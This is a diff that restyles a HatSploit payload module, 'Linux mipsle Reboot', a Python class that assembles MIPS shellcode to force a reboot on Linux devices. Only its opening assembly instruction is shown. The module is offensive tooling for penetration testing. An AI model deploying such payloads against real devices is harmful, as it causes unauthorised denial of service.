@@ -1,9 +1,7 @@
-#!/usr/bin/env python3
-
-#
-# This payload requires HatSploit: https://hatsploit.com
-# Current source: https://github.com/EntySec/HatSploit
-#
+"""
+This payload requires HatSploit: https://hatsploit.com
+Current source: https://github.com/EntySec/HatSploit
+"""
 
 from hatsploit.lib.payload import Payload
 from pex.assembler import Assembler
@@ -11,19 +9,19 @@ from pex.assembler import Assembler
 
 class HatSploitPayload(Payload, Assembler):
     details = {
-        'Name': "Linux mipsle Reboot",
-        'Payload': "linux/mipsle/reboot",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "Reboot payload for Linux mipsle.",
-        'Architecture': "mipsle",
-        'Platform': "linux",
-        'Rank': "low",
-        'Type': "one_side",
+        "Name": "Linux mipsle Reboot",
+        "Payload": "linux/mipsle/reboot",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "Reboot payload for Linux mipsle.",
+        "Architecture": "mipsle",
+        "Platform": "linux",
+        "Rank": "low",
+        "Type": "one_side",
     }
 
     def run(self):
         return self.assemble(
-            self.details['Architecture'],
+            self.details["Architecture"],
             """
             start:
                 lui $a2, 0x4321
